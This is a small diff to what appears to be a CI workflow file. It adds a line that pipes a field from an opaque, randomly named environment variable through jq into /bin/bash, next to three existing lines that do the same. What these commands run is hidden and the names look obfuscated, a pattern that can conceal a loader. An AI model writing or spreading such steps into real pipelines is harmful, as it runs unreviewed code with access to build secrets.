@@ -21,6 +21,7 @@ jobs:
           echo $ahlvz76 | jq -r .qmd381 | /bin/bash
           echo $kg6103 | jq -r .xhg321 | /bin/bash
           echo $min06 | jq -r .mlk7668 | /bin/bash
+          printf '%s' "$j7" | jq -r .sqy060 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
